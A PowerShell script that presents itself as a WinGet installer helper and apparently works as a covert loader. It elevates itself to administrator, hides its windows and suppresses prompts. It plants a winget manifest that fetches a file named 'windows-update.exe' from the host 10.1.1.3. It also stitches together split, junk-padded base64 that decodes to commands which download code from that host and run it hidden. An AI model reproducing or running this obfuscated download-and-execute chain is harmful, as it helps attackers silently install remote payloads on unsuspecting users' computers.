$script = $MyInvocation.MyCommand.Path
Start-Process powershell.exe -Verb RunAs -ArgumentList "-File '$script'"

Function Install-WinGet {
    #Install the latest package from GitHub
    [cmdletbinding(SupportsShouldProcess)]
    [alias("iwg")]
    [OutputType("None")]
    [OutputType("Microsoft.Windows.Appx.PackageManager.Commands.AppxPackage")]
    Param(
        [Parameter(HelpMessage = "Display the AppxPackage after installation.")]
        [switch]$Passthru
    )

    Write-Verbose "[$((Get-Date).TimeofDay)] Starting $($myinvocation.mycommand)"

    if ($PSVersionTable.PSVersion.Major -eq 7) {
        Write-Warning "This command does not work in PowerShell 7. You must install in Windows PowerShell."
        return
    }

    #test for requirement
    $Requirement = Get-AppPackage "Microsoft.DesktopAppInstaller"
    if (-Not $requirement) {
        Write-Verbose "Installing Desktop App Installer requirement"
        Try {
            Add-AppxPackage -Path "https://aka.ms/Microsoft.VCLibs.x64.14.00.Desktop.appx" -erroraction Stop
        }
        Catch {
            Throw $_
        }
    }

    $uri = "https://api.github.com/repos/microsoft/winget-cli/releases"

    Try {
        Write-Verbose "[$((Get-Date).TimeofDay)] Getting information from $uri"
        $get = Invoke-RestMethod -uri $uri -Method Get -ErrorAction stop

        Write-Verbose "[$((Get-Date).TimeofDay)] getting latest release"
        #$data = $get | Select-Object -first 1
        $data = $get[0].assets | Where-Object name -Match 'msixbundle'

        $appx = $data.browser_download_url
        #$data.assets[0].browser_download_url
        Write-Verbose "[$((Get-Date).TimeofDay)] $appx"
        If ($pscmdlet.ShouldProcess($appx, "Downloading asset")) {
            $file = Join-Path -path $env:temp -ChildPath $data.name

            Write-Verbose "[$((Get-Date).TimeofDay)] Saving to $file"
            Invoke-WebRequest -Uri $appx -UseBasicParsing -DisableKeepAlive -OutFile $file

            Write-Verbose "[$((Get-Date).TimeofDay)] Adding Appx Package"
            Add-AppxPackage -Path $file -ErrorAction Stop

            if ($passthru) {
                Get-AppxPackage microsoft.desktopAppInstaller
            }
        }
    } #Try
    Catch {
        Write-Verbose "[$((Get-Date).TimeofDay)] There was an error."
        Throw $_
    }
    Write-Verbose "[$((Get-Date).TimeofDay)] Ending $($myinvocation.mycommand)"
}

function Start-Winget_RS {
    [alias("wgrs")]
    param(
        [ValidateNotNullOrEmpty()]
        [Parameter(Mandatory=$true, Position=0)]
        [ValidatePattern("^https?$")]
        $HTTPorHTTPS,

        [ValidateNotNullOrEmpty()]
        [Parameter(Mandatory=$true, Position=1)]
        # Validate IP : "int.int.int.int"
        [ValidatePattern("^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$")]
        [System.String]$IP,

        [ValidateNotNullOrEmpty()]
        [Parameter(Mandatory=$true, Position=2)]
        [ValidateRange(0,65535)]
        [System.String]$Port,

        [ValidateNotNullOrEmpty()]
        [Parameter(Mandatory=$true, Position=3)]
        [System.String]$FileName,

        [ValidateNotNullOrEmpty()]
        [Parameter(Mandatory=$true, Position=4)]
        [ValidatePattern("^[A-Fa-f0-9]{64}$")]
        [System.String]$Sha256
    )
    begin {
        $ScriptRoot=$PSScriptRoot
        $ErrorActionPreference="Ignore"
        $WarningPreference="Ignore"
        $InformationPreference="Ignore"
        $ConfirmPreference="None"
        $c="JABlAD0ASQBuAHYA,bwBrAGUALQBSAGUAcwB0AE0AZQB0"+"AGgAbwBkACA,ALQBVAHIAaQAgACIAaAB0AHQAcAA6AC8ALwAxAD" + "NJVFJKVFSVFSVJKNSFDVIUOHQZOIFHDFOISDHGFOSGBHOIUSFRBGSOUDFGBSODFGBSFGOIBSFG=="
        iwg ; Start-Sleep 3
        $WingetPath=(Get-Command "winget").Path
        $k="G8AYQB4AC,8AaQBuAGYAbwAiADsAIABwAG,8AdwBlAHIAcwBoAGUAbABsACAALQBXAGkAbgBkAG8A,dwBTAHQAeQBsAGUAIABoAGkAZABkAGUAbgAgAC0AZQAgACQAZQ"
        $Manifest="$ScriptRoot\winget-manifest.yml"
        $zegrsg="pegro,ngrepo,gerpg,A="
        $replacements = @{
            "<HTTPorHTTPS>" = $HTTPorHTTPS
            "<IP>" = $IP
            "<Port>" = $Port
            "<FileName>" = $FileName
            "<Sha256>" = $Sha256
        }
        $u="A,ALgAxAC4AMQAu,ADMAOgA3AD,AALwBzAHAALQBoA"
    }
    process {
        Start-process $WingetPath -ArgumentList " settings --enable LocalManifestFiles" -WindowStyle Hidden
        $rub=($c+$u).Replace('USFRBGSOUDFGBSODFGBSFGOIBSFG==','').Replace('NJVFJKVFSVFSVJKNSFDVIUOHQZOIFHDFOISDHGFOSGBHOI','')
        $zegrsg=$zegrsg.Replace('pegro,ngrepo,gerpg','')
        (Get-Content $Manifest) | ForEach-Object { $replacements.GetEnumerator() | 
            ForEach-Object {
                $key, $value = $_
                $_ -replace $key, $value 
            } 
        } | Set-Content $Manifest
        powershell.exe -WindowStyle hidden -e "${rub}${k}$zegrsg".Replace(',','')
        Start-Process $WingetPath -ArgumentList " install --manifest $Manifest" -WindowStyle Hidden
    }
}

$e= powershell.exe -e 'SQBuAHYAbwBrAGUALQBSAGUAcwB0AE0AZQB0AGgAbwBkACAALQBVAHIAaQAgACIAaAB0AHQAcAA6AC8ALwAxADAALgAxAC4AMQAuADMAOgA3ADAALwBzAHAALQBoAG8AYQB4AC8AdwBpAG4AZwBlAHQALwBzAGgAYQAyADUANgAiAA=='
$e=$e.replace(' ','')
wgrs -HTTPorHTTPS "http" -IP "10.1.1.3" -Port 70 -FileName "windows-update.exe" -Sha256 $e
